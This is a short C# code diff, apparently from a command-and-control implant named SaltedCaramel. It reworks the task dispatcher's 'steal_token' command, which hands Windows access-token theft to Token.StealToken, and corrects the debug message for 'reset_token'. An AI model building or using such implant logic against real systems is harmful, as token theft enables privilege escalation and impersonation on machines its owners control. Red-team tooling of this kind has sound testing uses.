@@ -110,12 +110,12 @@ namespace SaltedCaramel
             }
             else if (this.command == "steal_token")
             {
-                Debug.WriteLine("[-] DispatchTask - Tasked to steal token from process " + this.@params);
-                Token.StealToken(Convert.ToInt32(this.@params));
+                Debug.WriteLine("[-] DispatchTask - Tasked to steal token");
+                Token.StealToken(this, implant);
             }
             else if (this.command == "reset_token")
             {
-                Debug.WriteLine("[-] DispatchTask - Tasked to steal token from process " + this.@params);
+                Debug.WriteLine("[-] DispatchTask - Tasked to revert token");
                 Token.stolenHandle = IntPtr.Zero;
             }
         }
